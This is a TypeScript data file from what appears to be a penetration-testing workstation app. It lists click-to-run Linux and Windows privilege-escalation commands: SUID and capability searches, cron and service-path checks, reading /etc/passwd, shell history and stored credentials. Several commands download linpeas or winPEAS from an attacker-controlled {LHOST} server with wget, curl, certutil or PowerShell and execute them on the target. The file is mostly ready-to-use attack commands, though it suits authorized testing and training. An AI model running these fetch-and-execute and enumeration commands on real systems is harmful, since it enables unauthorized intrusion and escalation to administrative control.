import type { WorkstationItem } from "../types";

/**
 * Privilege escalation and enumeration. Snippets are click-to-run in the active
 * shell; download helpers use {LHOST} so they line up with your HTTP server.
 */

const linuxPrivesc: WorkstationItem = {
  id: "linux-privesc",
  name: "Linux Privesc",
  category: "Privilege Escalation",
  summary: "Quick wins and enumeration for escalating on Linux hosts.",
  kind: "snippets",
  snippets: [
    { id: "id", label: "id / whoami", command: "id; whoami; hostname", explain: "Who you are and where you are." },
    { id: "sudo", label: "sudo -l", command: "sudo -l", explain: "Commands you can run as root. Cross-check with GTFOBins." },
    { id: "suid", label: "SUID binaries", command: "find / -perm -4000 -type f 2>/dev/null", explain: "SUID files may allow root execution." },
    { id: "sgid", label: "SGID binaries", command: "find / -perm -2000 -type f 2>/dev/null" },
    { id: "caps", label: "Capabilities", command: "getcap -r / 2>/dev/null", explain: "File capabilities can grant elevated rights." },
    { id: "cron", label: "Cron jobs", command: "cat /etc/crontab; ls -la /etc/cron.* 2>/dev/null", explain: "Writable scripts run by cron are a classic path." },
    { id: "writable", label: "World-writable files", command: "find / -writable -type f 2>/dev/null | grep -v '/proc/'" },
    { id: "kernel", label: "Kernel / OS", command: "uname -a; cat /etc/os-release", explain: "Match against known kernel exploits." },
    { id: "processes", label: "Processes as root", command: "ps aux | grep -i root" },
    { id: "netstat", label: "Listening ports", command: "ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null" },
    { id: "history", label: "Shell history", command: "cat ~/.bash_history 2>/dev/null; history" },
    { id: "envs", label: "Environment", command: "env" },
    { id: "passwd", label: "All users", command: "cat /etc/passwd" },
    {
      id: "linpeas",
      label: "Download + run linpeas (wget)",
      command: "cd /tmp && wget http://{LHOST}:{FILEPORT}/{FILE} -O {FILE} && chmod +x {FILE} && ./{FILE}",
      explain: "Set FILE=linpeas.sh in the Context bar and serve it first (see File Transfer).",
    },
    {
      id: "linpeas-curl",
      label: "Download + run linpeas (curl)",
      command: "cd /tmp && curl http://{LHOST}:{FILEPORT}/{FILE} -o {FILE} && chmod +x {FILE} && ./{FILE}",
      explain: "Alternative when wget is missing on the target.",
    },
  ],
};

const windowsPrivesc: WorkstationItem = {
  id: "windows-privesc",
  name: "Windows Privesc",
  category: "Privilege Escalation",
  summary: "Enumeration and quick wins for escalating on Windows hosts.",
  kind: "snippets",
  snippets: [
    { id: "whoami", label: "whoami /all", command: "whoami /all", explain: "Groups and privileges. Look for SeImpersonate." },
    { id: "systeminfo", label: "systeminfo", command: "systeminfo", explain: "Patch level for kernel exploit matching." },
    { id: "sysinfo-filter", label: "OS + arch", command: "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"" },
    { id: "users", label: "Local users", command: "net user; net localgroup administrators" },
    { id: "services-unquoted", label: "Unquoted service paths", command: "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\\\Windows\\\\\" | findstr /i /v \"\\\"\"" },
    { id: "whoami-priv", label: "Privileges", command: "whoami /priv" },
    { id: "netstat", label: "Listening ports", command: "netstat -ano" },
    { id: "scheduled", label: "Scheduled tasks", command: "schtasks /query /fo LIST /v" },
    { id: "creds-cmdkey", label: "Stored credentials", command: "cmdkey /list" },
    {
      id: "winpeas",
      label: "Download + run winPEAS (certutil)",
      command: "certutil -urlcache -f http://{LHOST}:{FILEPORT}/{FILE} {FILE} && {FILE}",
      explain: "Set FILE=winPEASx64.exe in the Context bar and serve it first (see File Transfer).",
    },
    {
      id: "winpeas-ps",
      label: "Download + run winPEAS (PowerShell)",
      command: "powershell -c \"Invoke-WebRequest -Uri http://{LHOST}:{FILEPORT}/{FILE} -OutFile {FILE}\" && {FILE}",
      explain: "Alternative when certutil is blocked.",
    },
  ],
};

export const PRIVESC: WorkstationItem[] = [linuxPrivesc, windowsPrivesc];
